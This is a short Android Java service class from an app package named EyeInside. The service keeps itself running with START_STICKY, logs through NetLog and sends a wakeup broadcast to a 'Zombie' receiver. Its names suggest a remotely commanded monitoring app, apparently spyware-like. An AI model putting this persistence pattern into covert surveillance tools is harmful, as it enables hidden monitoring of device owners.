package com.code4bones.EyeInside;

import java.util.Date;

import com.code4bones.utils.NetLog;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;

public class WorkerService extends Service {

	private final IBinder mBinder = null;//new WorkerBinder();
	
	public WorkerService() {
	}

	@Override
	public IBinder onBind(Intent arg0) {
		return mBinder;
	}
	
	@Override
	public void onCreate() {
		super.onCreate();
	}

	@Override
	public void onDestroy() {
		super.onDestroy();
		NetLog.v("Service Killed %s",this);
	}
	
	public final CommandPool mPool = CommandPool.getInstance();
	public int onStartCommand(Intent intent,int flags, int startId)
	{
		super.onStartCommand(intent,flags, startId);
		NetLog.v("SRV: Alive %s",new Date().toLocaleString());
		Intent wakeup = new Intent();
		wakeup.setAction(Zombie_BroadcastReceiver.ACTION_WAKEUP);
		this.sendBroadcast(wakeup);
		return START_STICKY;
	}

	
	/*
	public class WorkerBinder extends Binder {
		public WorkerService getService() {
			return WorkerService.this;
		}
	}
	*/
	
}
